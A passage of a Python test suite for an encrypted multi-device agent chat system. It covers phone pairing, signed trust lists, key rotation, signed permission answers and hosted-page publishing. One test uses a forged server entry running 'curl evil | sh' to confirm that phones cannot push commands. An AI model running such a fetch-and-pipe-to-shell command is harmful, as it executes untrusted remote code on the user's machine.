        try:
            self.a.say("all", "tampered in transit")
            time.sleep(1)
            self.assertFalse(self.b.has("tampered in transit"))
        finally:
            self.store.set = original

    def test_delivered_messages_are_deleted_from_the_cloud(self):
        self.a.say("all", "delete me later")
        wait_until(lambda: self.b.has("delete me later"))
        wait_until(lambda: self.store.list("messages"), message="the message to be in the store")
        for m in (self.a, self.b):
            m.sync.housekeeping()  # each machine reports how far it has read
        self.a.sync.housekeeping()  # the sender then deletes what everyone has
        self.assertEqual([i for i, d in self.store.list("messages") if d["dev"] == self.a.device.id], [])

    def test_removing_a_device_locks_it_out_of_new_messages(self):
        c = Machine(self.store, "laptop")
        self.a.account.approve("laptop", expect_fp=c.device.fp)
        wait_until(lambda: c.device.ready)
        old_key = self.a.device.current
        self.a.account.remove("windows")
        self.assertNotEqual(self.a.device.current, old_key)
        wait_until(lambda: c.device.current == self.a.device.current, message="the new key to reach the laptop")
        self.a.say("all", "after removal")
        wait_until(lambda: c.has("after removal"))
        time.sleep(0.5)
        self.assertFalse(self.b.has("after removal"))
        self.assertNotIn(self.b.device.id, self.a.device.trust["devices"])
        wait_until(lambda: self.b.sync.stop_event.is_set(), message="the removed machine to stop syncing")
        c.stop()


class Phone:
    """What the hosted page does on a phone (W13), in Python: the browser's own code is checked against this in the
    browser test. A device of kind phone, with its own key, that pairs by a machine's code."""
    count = 0

    def __init__(self, store, name="phone"):
        Phone.count += 1
        self.store = store
        self.device = cloud.Device(Path(TMP) / ("phone%d" % Phone.count))
        self.device.create(name)
        self.device.tag = "P%d" % Phone.count
        self.account = cloud.Account(store, self.device)
        self.sent = 0

    def pair(self, code, wait=True, pub=None):
        code = clean_code(code)
        pid, secret = code[:4], code[4:]
        pub = pub or self.device.pub
        self.store.set("devices/" + self.device.id, {
            "name": self.device.name, "tag": self.device.tag, "pub": pub, "fp": cloud.fingerprint(pub),
            "kind": "phone", "seen": cloud.SERVER_TIME,
            "pair": {"id": pid, "mac": cloud.pair_mac(secret, "phone", pid, pub.strip())}})
        if not wait:
            return None
        answer = wait_until(lambda: self.store.get("pairings/" + pid), message="the machine's half of the pairing")
        trust = self.store.get("meta/trust")
        signer = trust["devices"][trust["signer"]]
        # The list this phone takes must be signed by the machine whose code it had.
        self.machine_proved = cloud.pair_mac(secret, "machine", pid, signer["pub"].strip(), str(trust["version"])) == answer["mac"]
        self.account.refresh()
        return answer

    def scope(self, base=""):
        return self.store.root if hasattr(self.store, "root") else "users/memory/" + base

    def send(self, text, sender=crewchat.OWNER, to="all", base="", kind="msg", dev=None, kid=None, **fields):
        """A message as the page's send() writes it; or, with fields, kind, dev or kid, one it does not write (as a
        phone's own script could): with other fields, as another device, or with an older key."""
        self.sent += 1
        mid = "%s%d" % (self.device.tag, self.sent)
        kid = kid or self.device.current
        dev = dev or self.device.id
        payload = dict({"id": mid, "ts": time.time(), "from": sender, "to": to, "text": text, "kind": kind}, **fields)
        nonce, ct = cloud.seal(self.device.keys[kid], "crewchat|%s|msg|%s|%s|%s" % (self.scope(base), mid, kid, dev),
                               payload)
        self.store.set(base + "messages/" + mid, {"dev": dev, "key_id": kid, "nonce": nonce, "ct": ct,
                                                  "created": cloud.SERVER_TIME})
        return mid

    def answer(self, machine, item, body, when=None, signer=None, aid=None, base=""):
        aid = aid or "%s-%s" % (self.device.tag, os.urandom(4).hex())
        signed = json.dumps({"id": aid, "by": self.device.id, "machine": machine, "item": item, "body": body,
                             "time": time.time() if when is None else when})
        sig = cloud.sign(signer or self.device.private, signed.encode("utf-8"))
        kid = self.device.current
        nonce, ct = cloud.seal(self.device.keys[kid], "crewchat|%s|answer|%s|%s|%s" % (self.scope(base), aid, kid, self.device.id),
                               {"signed": signed, "sig": sig})
        self.store.set(base + "answers/" + aid, {"dev": self.device.id, "key_id": kid, "nonce": nonce, "ct": ct,
                                                 "created": cloud.SERVER_TIME})
        return aid

    def page(self, machine, base=""):
        doc = self.store.get(base + "pages/" + machine)
        if not doc:
            return None
        return cloud.unseal(self.device.keys[doc["key_id"]], "crewchat|%s|page|%s|%s" % (self.scope(base), machine, doc["key_id"]),
                            doc["nonce"], doc["ct"])


@unittest.skipUnless(HAVE_CRYPTO, "needs the cryptography library")
class Phones(unittest.TestCase):
    """The hosted page's phone (W13): pairing by code, posting as the owner, signed answers, the 7-day window."""

    def setUp(self):
        self.store = cloud.MemoryStore()
        self.a = Machine(self.store, "mac")
        self.b = Machine(self.store, "windows")
        self.a.account.approve("windows", expect_fp=self.b.device.fp)
        wait_until(lambda: self.b.device.ready, message="approval")
        self.phone = Phone(self.store)

    def tearDown(self):
        for m in (self.a, self.b):
            m.stop()

    def paired(self):
        code = self.a.sync.start_pairing()["code"]
        self.phone.pair(code)
        wait_until(lambda: self.phone.device.ready, message="the phone to get the account key")
        wait_until(lambda: cloud.is_phone(self.b.device.trusted(self.phone.device.id)), message="the windows machine to trust it")
        return code

    def test_a_phone_pairs_with_the_code_once_and_gets_the_account_key(self):
        code = self.paired()
        entry = self.a.device.trusted(self.phone.device.id)
        self.assertEqual(entry["kind"], "phone")
        self.assertEqual(self.phone.device.current, self.a.device.current)
        self.assertTrue(self.phone.machine_proved)  # the machine proved it had the code too
        self.assertEqual([r["name"] for r in self.a.sync.machines_status()], ["windows"])  # a phone is not a machine
        (self.a.root / "cloud" / "firebase.json").write_text(json.dumps({"projectId": "my-proj"}))
        listed = cloud.phone_op(self.a.hub, self.a.root, self.a.account, "cloud-phone-list", {})
        self.assertEqual(([p["name"] for p in listed["phones"]], listed["days"]), (["phone"], 7))
        other = Phone(self.store, "thief")
        other.pair(code, wait=False)  # the same code again: it worked once
        time.sleep(0.5)
        self.assertIsNone(self.a.device.trusted(other.device.id))
        self.assertNotIn(other.device.id, self.a.sync.waiting)  # and a phone never waits for a hand approval
        with self.assertRaises(cloud.CloudError):
            self.a.account.approve(other.device.id)

    def test_a_wrong_or_expired_code_is_refused(self):
        code = self.a.sync.start_pairing()["code"]
        wrong = code[:4] + ("A" if code[4] != "A" else "B") + code[5:]
        self.phone.pair(wrong, wait=False)
        time.sleep(0.5)
        self.assertIsNone(self.a.device.trusted(self.phone.device.id))
        late = Phone(self.store, "late")
        code = self.a.sync.start_pairing()["code"]
        self.a.sync.pairings[code[:4]]["expires"] = time.time() - 1
        late.pair(code, wait=False)
        time.sleep(0.5)
        self.assertIsNone(self.a.device.trusted(late.device.id))
        self.assertEqual(len(cloud.pair_code()), 20)
        self.assertEqual(clean_code("abcd-efgh ijkl"), "ABCDEFGHJKL")  # I is not in the alphabet

    def test_a_phone_cannot_change_who_is_trusted(self):
        self.paired()
        intruder = cloud.Device(Path(TMP) / "intruder")
        intruder.create("intruder")
        devices = dict(self.a.device.trust["devices"])
        devices[intruder.id] = {"fp": intruder.fp, "name": "intruder", "tag": "Z", "pub": intruder.pub}
        version = int(self.a.device.trust["version"]) + 1
        forged = {"devices": devices, "version": version, "signer": self.phone.device.id,
                  "sig": cloud.sign(self.phone.device.private, cloud.trust_payload(devices, version))}
        self.assertFalse(self.a.account.accept_trust(forged))
        self.assertFalse(self.b.account._valid_trust(forged))
        # Nor can it hand out keys: a key it wraps for another device is not taken.
        target = cloud.Device(Path(TMP) / "target")
        target.create("target")
        target.trust = dict(self.a.device.trust)
        wrapped, sig = cloud.wrap_for(self.phone.device, target.id, target.pub, self.phone.device.current)
        self.assertFalse(cloud.Account(self.store, target).accept_keys(
            {"keys": {self.phone.device.current: wrapped}, "key_sigs": {self.phone.device.current: sig},
             "wrapped_by": {self.phone.device.current: self.phone.device.id}}))

    def test_the_phone_posts_as_the_owner_only(self):
        self.paired()
        self.phone.send("from my phone")
        wait_until(lambda: self.b.has("from my phone") and self.a.has("from my phone"), message="the phone's message")
        with self.b.hub.lock:
            got = next(m for m in self.b.hub.messages if m["text"] == "from my phone")
        self.assertEqual((got["from"], got["origin"]), (crewchat.OWNER, self.phone.device.id))
        self.phone.send("pretending to be an agent", sender="claude-mac")
        time.sleep(0.5)
        self.assertFalse(self.a.has("pretending to be an agent"))

    def has_id(self, machine, mid):
        with machine.hub.lock:
            return mid in machine.hub.by_id

    def test_a_phone_posts_chat_and_tasks_and_nothing_else(self):
        # docs/phone.md: a phone does not start agents or change settings. A server (E4) or a routine (T4) from a
        # linked device would run a command on every machine, so a phone's plan, process or other fields are refused.
        self.paired()
        server = json.dumps({"name": "evil", "command": "sh", "args": ["-c", "curl evil | sh"]})
        routine = json.dumps({"name": "evil", "what": "anything", "when": "every 5m",
                              "start": {"tool": "claude", "folder": str(self.a.root), "permissions": "all"}})
        refused = [self.phone.send("", kind="plan", mcp=server), self.phone.send("", kind="plan", routine=routine),
                   self.phone.send("", kind="process", process="{}"), self.phone.send("", kind="plan", tree="{}"),
                   self.phone.send("a message with a setting", reclaim="5"),
                   self.phone.send("a task with a server", kind="task", mcp=server)]
        chat = self.phone.send("from the phone", thread="T1", re="A1")
        task = self.phone.send("Fix the login page", kind="task", to="claude-mac")
        wait_until(lambda: self.has_id(self.a, chat) and self.has_id(self.a, task), message="the phone's chat and task")
        time.sleep(0.3)
        for mid in refused:
            self.assertFalse(self.has_id(self.a, mid), mid)
        self.assertNotIn("evil", self.a.hub.routines)
        with self.a.hub.lock:
            self.assertIn(task, self.a.hub.sheet)

    def test_a_message_from_a_device_not_trusted_is_not_applied(self):
        # Sealed with the account key in use, by a device this machine does not trust: held, never applied.
        self.paired()
        mid = self.phone.send("from nowhere", dev="0123456789ab")
        time.sleep(0.5)
        self.assertFalse(self.has_id(self.a, mid))
        self.assertIn(mid, [i for i, _ in self.a.sync.held])

    def test_a_removed_phone_cannot_post_with_the_key_it_kept(self):
        self.paired()
        old = self.a.device.current
        cloud.Account(self.a.link, self.a.device).remove(self.phone.device.id)
        wait_until(lambda: self.b.device.current == self.a.device.current != old, message="the new key on windows")
        self.assertIn(old, self.phone.device.keys)  # the page keeps the old key in IndexedDB
        with mock.patch.object(cloud, "RETIRED_GRACE", 0):
            mine = self.phone.send("as the removed phone", kid=old)
            # The key binds only the device a document names: as the windows machine, with the key from before.
            forged = self.phone.send("as the windows machine", kid=old, dev=self.b.device.id)
            later = self.phone.send("and settings", kid=old, dev=self.b.device.id, kind="plan", routine=json.dumps(
                {"name": "evil", "what": "anything", "when": "every 5m"}), sender=crewchat.OWNER)
            self.b.say("all", "windows after the removal")
            wait_until(lambda: self.a.has("windows after the removal"), message="the machine's own message")
            time.sleep(0.3)
            for mid in (mine, forged, later):
                self.assertFalse(self.has_id(self.a, mid), mid)
            self.assertNotIn("evil", self.a.hub.routines)
        # The account cannot be turned back to the key the phone kept, once it has been retired a while.
        self.a.device.retired[old] -= cloud.RETIRED_GRACE + 1
        self.assertFalse(self.a.account.accept_account({"key_id": old}))
        self.assertNotEqual(self.a.device.current, old)

    def test_a_machine_writing_with_the_old_key_just_after_a_removal_still_arrives(self):
        # Written before the key changed, and read after; or written just after, by a machine that had not heard of
        # the new key yet: both arrive.
        self.paired()
        old = self.a.device.current
        sync = self.b.sync
        before = self.machine_message(sync, "written before the change", old)
        time.sleep(0.05)
        cloud.Account(self.a.link, self.a.device).remove(self.phone.device.id)
        self.assertIn(old, self.a.device.retired)
        just_after = self.machine_message(sync, "written just after", old)
        with mock.patch.object(cloud, "RETIRED_GRACE", 0):
            self.a.sync._on_messages([("added", before[0], before[1])])
        self.a.sync._on_messages([("added", just_after[0], just_after[1])])
        self.assertTrue(self.has_id(self.a, before[0]))
        self.assertTrue(self.has_id(self.a, just_after[0]))
        with mock.patch.object(cloud, "RETIRED_GRACE", 0):  # long after: refused
            late = self.machine_message(sync, "written long after", old)
            self.a.sync._on_messages([("added", late[0], late[1])])
        self.assertFalse(self.has_id(self.a, late[0]))

    def machine_message(self, sync, text, kid):
        """A message as the machine of sync writes it, sealed with key kid, kept off the listeners: (id, doc as read)."""
        mid = "W%s" % os.urandom(4).hex()
        payload = {"id": mid, "ts": time.time(), "from": crewchat.OWNER, "to": "all", "text": text, "kind": "msg"}
        nonce, ct = cloud.seal(sync.device.keys[kid], "crewchat|%s|msg|%s|%s|%s" % (sync._scope(), mid, kid, sync.device_id),
                               payload)
        self.store.set("held/" + mid, {"dev": sync.device_id, "key_id": kid, "nonce": nonce, "ct": ct, "created": time.time()})
        return mid, self.store.get("held/" + mid)

    def test_a_catch_up_brings_settings_only_from_a_trusted_machine(self):
        self.paired()
        sync = self.a.sync
        routine = json.dumps({"name": "relayed", "what": "anything", "when": "every 5m"})

        def part(by, tag):
            messages = [{"id": tag + "1", "ts": time.time(), "from": crewchat.OWNER, "to": "all", "text": "chat " + tag,
                         "kind": "msg"},
                        {"id": tag + "2", "ts": time.time(), "from": crewchat.OWNER, "to": "all", "text": "",
                         "kind": "plan", "routine": routine.replace("relayed", "relayed-" + tag.lower())}]
            kid = self.phone.device.current
            nonce, ct = cloud.seal(self.phone.device.keys[kid], sync._part_aad(self.a.device.id, 0, by) % kid,
                                   {"messages": messages})
            self.store.set("catchup_parts/%s-0" % self.a.device.id, {"dev": by, "key_id": kid, "nonce": nonce, "ct": ct,
                                                                     "for": self.a.device.id, "created": time.time()})
            return {"state": "ready", "parts": 1, "more": False, "by": by}

        for by, tag in ((self.phone.device.id, "P"), ("0123456789ab", "U")):  # the phone, or a device not trusted
            sync.read_catch_up(part(by, tag))
            self.assertTrue(self.has_id(self.a, tag + "1"))
            self.assertFalse(self.has_id(self.a, tag + "2"))
            self.assertNotIn("relayed-" + tag.lower(), self.a.hub.routines)
        sync.read_catch_up(part(self.b.device.id, "M"))  # a trusted machine relays what it has
        self.assertTrue(self.has_id(self.a, "M2"))
        self.assertIn("relayed-m", self.a.hub.routines)

    def test_a_message_from_the_phone_waits_for_a_sleeping_machine(self):
        self.paired()
        self.b.stop()  # every other machine asleep
        self.phone.send("while you slept")
        time.sleep(0.3)
        self.assertFalse(self.b.has("while you slept"))
        self.b.sync = cloud.CloudSync(self.b.hub, self.b.link, self.b.device, log=lambda text: None).start()  # wakes
        wait_until(lambda: self.b.has("while you slept"), message="the message on waking")

    def test_the_page_snapshot_shows_the_roster_and_needs_you(self):
        name = self.a.agent()
        self.assertIsNone(self.phone.page(self.a.device.id))  # no phone, no snapshot
        self.paired()
        page = wait_until(lambda: self.phone.page(self.a.device.id), message="the mac's page snapshot")
        self.assertEqual(page["machine"], "mac")
        self.assertIn(name, [r["agent"] for r in page["agents"]])
        self.assertIn("need_kinds", page["boot"])
        self.assertNotIn("messages", page)

    def test_a_snapshot_always_fits_in_a_document(self):
        self.paired()
        big = [{"key": "permission:%d" % i, "kind": "permission", "text": "x" * 4000, "agent": "a"} for i in range(60)]
        with mock.patch.object(self.a.hub, "needs_you", return_value=big):
            page = self.a.sync.page_snapshot()
            self.assertLessEqual(len(json.dumps(page, ensure_ascii=False).encode()), cloud.PAGE_BYTES)
            cloud.allowed(self.a.sync._seal("aad|%s", page))  # within the security rules once sealed
        self.assertEqual(len(page["needs"][0]["text"]), 500)

    def test_a_snapshot_names_only_the_receipts_the_phone_can_show_and_never_goes_over(self):
        self.paired()
        hub = self.a.hub
        mid = self.a.say("all", "a task to take off", kind="task")["id"]
        with hub.lock:
            hub.sheet[mid]["removed"] = True
            for n in range(3000):  # asks answered long ago, no longer in memory: the phone has not their messages
                hub.ask_answered["old-ask-%04d-%s" % (n, "x" * 20)] = "answer"
            hub.woke.update({"woke-%d" % n: ["claude-mac"] for n in range(500)})
        page = self.a.sync.page_snapshot()
        self.assertNotIn("woke", page)  # the hosted page shows no woke marks
        self.assertEqual((page["asks"], page["removed"]), ({}, [mid]))
        # Still too big once cut down (a roster of hundreds): not written, said once, and the phone keeps the last.
        logged = []
        self.a.sync.log = logged.append
        huge = ({"agents": []}, json.dumps({"agents": ["x" * (cloud.PAGE_BYTES + 1)]}))
        with mock.patch.object(self.a.sync, "_page", return_value=huge):
            before = self.store.get("pages/" + self.a.device.id)
            for _ in range(2):
                self.a.sync.page_sent = cloud.PAGE_UNSENT
                self.a.sync._send_page()
        self.assertEqual(len([t for t in logged if "too big" in t]), 1)
        self.assertEqual(self.store.get("pages/" + self.a.device.id), before)

    def test_a_snapshot_that_fails_does_not_send_a_message_again(self):
        self.paired()
        sent = []
        original = self.a.sync._send_message
        self.a.sync._send_message = lambda msg: sent.append(msg["id"]) or original(msg)
        self.a.sync.log = lambda text: None
        with mock.patch.object(self.a.sync, "_send_page", side_effect=cloud.CloudError("PERMISSION_DENIED")):
            mid = self.a.say("all", "sent once")["id"]
            wait_until(lambda: self.b.has("sent once"), message="the message")
            time.sleep(2.5)  # past the worker's first backoff
        self.assertEqual(sent.count(mid), 1)
        self.assertTrue(self.a.sync.online)

    def test_a_snapshot_is_not_written_again_for_only_last_seen(self):
        # Last seen and token usage change at almost every hook: alone they are written at most every SEEN_EVERY.
        name = self.a.agent()
        self.paired()
        sync, hub = self.a.sync, self.a.hub
        sync.stop()  # this test sends the snapshots itself
        time.sleep(1.2)
        path = "pages/" + self.a.device.id
        clock = [time.time()]

        class Clock:
            def __getattr__(self, attr):
                return (lambda: clock[0]) if attr == "time" else getattr(time, attr)

        def step(seconds, change=None):
            clock[0] += seconds
            with hub.lock:
                if change:
                    change(hub.agents[name])
                hub._changed()
            with mock.patch.object(cloud, "time", Clock()):
                sync._send_page()
            return self.store.written.get(path)

        sync.page_sent = cloud.PAGE_UNSENT
        first = step(0)
        self.assertIsNotNone(first)
        seen = lambda agent: agent.update(seen=agent["seen"] + 1)  # noqa: E731
        self.assertEqual(step(cloud.PAGE_EVERY + 1, seen), first)  # only last seen: not written
        self.assertEqual(step(cloud.PAGE_EVERY + 1, seen), first)
        second = step(cloud.PAGE_EVERY + 1, lambda agent: agent.update(status="on the login page"))
        self.assertNotEqual(second, first)  # a real change is
        self.assertEqual(step(cloud.PAGE_EVERY + 1, seen), second)
        self.assertNotEqual(step(cloud.SEEN_EVERY), second)  # and last seen, after SEEN_EVERY
        self.assertEqual(self.phone.page(self.a.device.id)["agents"][0]["status"], "on the login page")

    def ask(self, hub, name):
        out = {}

        def wait():
            with hub.lock:
                out["ask"] = hub.asks.wait_for("permission", name, "rm -rf build", time.time() + 20, tool="Bash")
        t = threading.Thread(target=wait)
        t.start()
        item = wait_until(lambda: next((n for n in hub.needs_you() if n["kind"] == "permission"), None),
                          message="the prompt in Needs you")
        return t, out, item

    def test_a_signed_answer_from_the_phone_allows_a_command(self):
        name = self.a.agent()
        self.paired()
        t, out, item = self.ask(self.a.hub, name)
        page = wait_until(lambda: (self.phone.page(self.a.device.id) or {}).get("needs") and self.phone.page(self.a.device.id),
                          message="the prompt in the mac's snapshot")
        self.assertEqual(page["needs"][0]["key"], item["key"])
        aid = self.phone.answer(self.a.device.id, item["key"], {"answer": "allow"})
        t.join(10)
        self.assertEqual(out["ask"]["answer"], "allow")
        wait_until(lambda: self.store.get("answers/" + aid) is None, message="the answer to be deleted once used")

    def test_answers_that_are_not_right_are_refused(self):
        name = self.a.agent()
        self.paired()
        t, out, item = self.ask(self.a.hub, name)
        stranger = cloud.new_private_key()
        self.phone.answer(self.a.device.id, item["key"], {"answer": "allow"}, signer=stranger)  # not the phone's key
        self.phone.answer(self.a.device.id, item["key"], {"answer": "allow"}, when=time.time() - 3600)  # stale
        self.phone.answer(self.b.device.id, item["key"], {"answer": "allow"})  # for the other machine
        time.sleep(0.8)
        self.assertEqual(out.get("ask"), None)  # still waiting
        aid = self.phone.answer(self.a.device.id, item["key"], {"answer": "deny", "note": "not now"})
        t.join(10)
        self.assertEqual((out["ask"]["answer"], out["ask"]["note"]), ("deny", "not now"))
        # The same answer written again is not applied twice.
        self.assertIn(aid, self.a.sync.answered)

    def test_answered_ids_are_forgotten_once_a_copy_would_be_too_old(self):
        # A copy of an answer is refused by its age after ANSWER_SECS either side: its id is not kept for ever.
        name = self.a.agent()
        self.paired()
        t, out, item = self.ask(self.a.hub, name)
        aid = self.phone.answer(self.a.device.id, item["key"], {"answer": "allow"})
        t.join(10)
        self.assertIn(aid, self.a.sync.answered)
        later = time.time() + 2 * cloud.ANSWER_SECS + 1

        class Later:
            def __getattr__(self, attr):
                return (lambda: later) if attr == "time" else getattr(time, attr)
        with mock.patch.object(cloud, "time", Later()):
            self.a.sync._on_answers([])
        self.assertNotIn(aid, self.a.sync.answered)

    def test_a_removed_phones_answer_is_refused(self):
        name = self.a.agent()
        self.paired()
        cloud.Account(self.a.link, self.a.device).remove(self.phone.device.id)
        t, out, item = self.ask(self.a.hub, name)
        self.phone.answer(self.a.device.id, item["key"], {"answer": "allow"})
        time.sleep(0.8)
        self.assertNotIn("ask", out)
        cloud.crewchat.answer_need(self.a.hub, {"key": item["key"], "answer": "deny"})
        t.join(10)

    def test_a_phone_unpairs_itself(self):
        self.paired()
        self.phone.answer("*", "leave", {})
        wait_until(lambda: self.a.device.trusted(self.phone.device.id) is None, message="the phone to be removed")
        wait_until(lambda: self.phone.device.current != self.a.device.current, message="a new key the phone lacks")

    def test_with_a_phone_messages_stay_in_the_cloud_for_the_window(self):
        self.a.say("all", "kept for the phone")
        wait_until(lambda: self.b.has("kept for the phone"))
        self.paired()
        for m in (self.a, self.b, self.a):
            m.sync.housekeeping()  # everyone has read it: without a phone it would go now
        self.assertTrue([i for i, d in self.store.list("messages") if d["dev"] == self.a.device.id])
        self.assertEqual(self.a.sync.window(), 7 * 86400)
        mid = self.phone.send("old phone message")
        with self.store.lock:
            for doc in self.store.docs.values():
                if "created" in doc:
                    doc["created"] -= 8 * 86400  # a week and a day ago
        self.a.sync.renew_lease(force=True)
        self.a.sync.housekeeping()
        self.assertIsNone(self.store.get("messages/" + mid))
        self.assertFalse([i for i, d in self.store.list("messages") if d["dev"] == self.a.device.id])

    def test_a_phone_not_opened_for_a_month_is_removed(self):
        self.paired()
        with self.store.lock:
            self.store.docs["devices/" + self.phone.device.id]["seen"] = time.time() - 31 * 86400
        self.a.sync.renew_lease(force=True)
        self.a.sync.housekeeping()
        self.assertIsNone(self.a.device.trusted(self.phone.device.id))

    def test_remove_and_clear_deletes_the_cloud_window(self):
        self.paired()
        self.phone.send("on the phone")
        wait_until(lambda: self.a.has("on the phone"))
        root = self.a.root
        (root / "cloud" / "firebase.json").write_text(json.dumps({"projectId": "my-proj"}))
        out = cloud.phone_op(self.a.hub, root, cloud.Account(self.a.link, self.a.device), "cloud-phone-remove",
                             {"name": self.phone.device.id, "clear": True})
        self.assertEqual(out, {"removed": "phone", "cleared": True})
        self.assertEqual(self.store.list("messages"), [])
        self.assertTrue(self.a.has("on the phone"))  # the machines keep the history
        with self.assertRaises(cloud.CloudError):  # a machine is removed on its own row, not as a phone
            cloud.phone_op(self.a.hub, root, self.a.account, "cloud-phone-remove", {"name": "windows"})

    def test_the_pairing_panel_gives_the_link_code_and_qr(self):
        (self.a.root / "cloud" / "firebase.json").write_text(json.dumps({"projectId": "my-proj"}))
        out = cloud.phone_op(self.a.hub, self.a.root, self.a.account, "cloud-phone-pair", {})
        code = out["code"].replace(" ", "")
        self.assertTrue(out["link"].startswith("https://my-proj.firebaseapp.com/#pair="))
        self.assertTrue(out["link"].endswith(code))
        self.assertEqual(len(code), 20)
        self.assertTrue(out["qr"])
        self.phone.pair(code)
        wait_until(lambda: self.phone.device.ready)

    def test_the_last_machine_leaving_resets_the_account_even_with_a_phone(self):
        self.paired()
        self.a.account.remove("windows")
        cloud.Account(self.a.link, self.a.device).remove(self.a.device.id)
        self.assertIsNone(self.store.get("meta/account"))


class HostedPage(unittest.TestCase):
    """The hosted page's files, and publishing them to the project's Firebase Hosting (W13), with Google stubbed."""

    def setUp(self):
        self.root = Path(tempfile.mkdtemp(prefix="hosted-", dir=TMP))
        (self.root / "cloud").mkdir()
        (self.root / "cloud" / "firebase.json").write_text(json.dumps(
            {"projectId": "my-proj", "apiKey": "k", "oauth": {"client_id": "c", "client_secret": "s"}}))
        self.sdk = {name: ("/* %s */" % name).encode() for name in cloud.FIREBASE_FILES}
        patch = mock.patch.dict(cloud.FIREBASE_FILES, {n: __import__("hashlib").sha256(d).hexdigest()
                                                       for n, d in self.sdk.items()})
        patch.start()
        self.addCleanup(patch.stop)

    def test_the_page_runs_the_sdk_and_its_own_script_before_the_chat_pages(self):
        page = cloud.hosted_page().decode()
        first = page.index("<script")
        self.assertTrue(page[first:].startswith('<script src="/firebase-app-compat.js"></script>'))
        self.assertLess(page.index('<script src="/hosted.js">'), page.index("<script>"))
        self.assertIn("CREWCHAT_FAKE_STORE", cloud.hosted_page("http://127.0.0.1:1/store").decode())
        self.assertNotIn("gstatic", page)  # the SDK is served from the owner's site, not Google's CDN

    def test_publish_deploys_every_file_and_says_which_build(self):
        calls = []

        def request(method, url, token, body=None, raw=None):
            calls.append((method, url, body, raw))
            self.assertEqual(token, "TOKEN")
            if url.endswith("/versions"):
                return {"name": "sites/my-proj/versions/v1"}
            if url.endswith(":populateFiles"):
                return {"uploadRequiredHashes": list(body["files"].values()), "uploadUrl": "https://upload/v1"}
            return {}
        asked = []
        out = cloud.publish(self.root, consent=lambda client, scope, need_browser: asked.append(scope) or {"access_token": "TOKEN"},
                            fetch=lambda name: self.sdk[name], request=request)
        self.assertEqual(asked, [cloud.HOSTING_SCOPE])
        self.assertEqual(out, {"build": cloud.hosted_build(), "url": "https://my-proj.firebaseapp.com/"})
        config = calls[0][2]["config"]["headers"][0]
        self.assertIn("frame-ancestors 'none'", config["headers"]["Content-Security-Policy"])
        files = calls[1][2]["files"]
        self.assertEqual(set(files), {"/" + n for n in list(cloud.hosted_own_files()) + list(self.sdk)})
        uploads = {c[1].rsplit("/", 1)[1]: __import__("gzip").decompress(c[3]) for c in calls if c[1].startswith("https://upload/")}
        self.assertEqual(uploads[files["/hosted.js"]], cloud.HOSTED_JS.encode())
        self.assertEqual([c[0] for c in calls[-2:]], ["PATCH", "POST"])
        self.assertIn("releases?versionName=sites/my-proj/versions/v1", calls[-1][1])
        saved = json.loads((self.root / "cloud" / "hosted.json").read_text())
        self.assertEqual(saved["build"], cloud.hosted_build())

    def test_an_sdk_file_that_is_not_the_pinned_one_is_refused(self):
        bad = dict(self.sdk, **{"firebase-auth-compat.js": b"something else"})
        with self.assertRaises(cloud.CloudError) as e:
            cloud.publish(self.root, consent=lambda *a, **k: self.fail("asked Google before checking the files"),
                          fetch=lambda name: bad[name], request=lambda *a, **k: self.fail("deployed"))
        self.assertIn("firebase-auth-compat.js", str(e.exception))

    def test_publish_only_at_the_machine_itself(self):
        with self.assertRaises(cloud.CloudError):
            cloud.phone_op(mock.Mock(sync=None), self.root, None, "cloud-publish", {}, local=False)


@unittest.skipUnless(HAVE_CRYPTO, "needs the cryptography library")
class ThreeMachines(unittest.TestCase):
    """Three machines on one account: what two do, with a third that sees all of it, or is away."""

    def setUp(self):
        self.store = cloud.MemoryStore()
        self.a, self.b, self.c = (Machine(self.store, n) for n in ("mac", "windows", "laptop"))
        for m in (self.b, self.c):
            self.a.account.approve(m.device.name, expect_fp=m.device.fp)
            wait_until(lambda: m.device.ready, message="the approval")
        self.machines = (self.a, self.b, self.c)

    def tearDown(self):
        for m in self.machines:
            m.stop()

    def count(self, machine, text):
        with machine.hub.lock:
            return sum(m["text"] == text for m in machine.hub.messages)

    def test_every_message_reaches_both_others_once(self):
        agents = [m.agent() for m in self.machines]
        wait_until(lambda: any(r["agent"] == agents[0] for r in self.c.hub.rows()), message="the laptop to see the mac's agent")
        for m, agent in zip(self.machines, agents):
            m.hub.send(agent, "all", "hello from %s" % m.device.name)
        self.c.hub.send(agents[2], agents[0], "laptop to mac only")
        for m in self.machines:
            for text in ["hello from %s" % n for n in ("mac", "windows", "laptop")] + ["laptop to mac only"]:
                wait_until(lambda: self.count(m, text) == 1, message="%s to have %r" % (m.device.name, text))
        time.sleep(0.5)
        for m in self.machines:
            self.assertEqual(self.count(m, "hello from mac"), 1)  # never twice, however many machines pass it on
        ids = [{msg["id"] for msg in m.hub.messages} for m in self.machines]
        self.assertEqual(ids[0], ids[1])
        self.assertEqual(ids[1], ids[2])

    def test_exactly_one_agent_of_three_machines_takes_a_task(self):
        racers = [(m, m.agent()) for m in self.machines for _ in range(2)]
        for origin in self.machines:
            task = origin.say("all", "the build, from %s" % origin.device.name, "task")
            for m in self.machines:
                wait_until(lambda: m.has(task["text"]), message="the task everywhere")
            results = {}

            def take(machine, name):
                try:
                    machine.hub.take(name, task["id"])
                    results[name] = "won"
                except crewchat.HubError as e:
                    results[name] = str(e)
            threads = [threading.Thread(target=take, args=r) for r in racers]
            [t.start() for t in threads]
            [t.join() for t in threads]
            winners = [n for n, r in results.items() if r == "won"]
            self.assertEqual(len(winners), 1, results)
            wait_until(lambda: all(m.hub.taken.get(task["id"]) == winners[0] for m in self.machines),
                       message="all three to agree")

    def test_when_the_coordinator_goes_offline_one_of_the_other_two_takes_over(self):
        now = [time.time()]
        for m in self.machines:
            m.sync.clock = lambda: now[0]
        self.a.sync.renew_lease()
        for m in (self.b, self.c):
            m.sync.renew_lease()  # a live lease is left alone
            wait_until(lambda: m.sync.coordinator()["name"] == "mac", message="%s to name the mac" % m.device.name)
        self.a.link.online = False
        now[0] += cloud.LEASE_SECS + 1
        self.b.sync.renew_lease()
        self.c.sync.renew_lease()  # the windows machine was first: the laptop leaves its new lease alone
        for m in (self.b, self.c):
            wait_until(lambda: m.sync.coordinator()["name"] == "windows", message="%s to name windows" % m.device.name)
        self.assertEqual([m.sync.coordinator()["me"] for m in (self.b, self.c)], [True, False])
        self.a.link.online = True
        self.a.sync.renew_lease()
        wait_until(lambda: self.a.sync.coordinator()["name"] == "windows", message="the mac, back, to name windows")
        self.assertFalse(self.a.sync.coordinator()["me"])

    def test_the_third_machine_away_catches_up_on_both_others_through_the_coordinator(self):
        self.c.stop()  # the laptop is off
        texts = []
        for i in range(10):
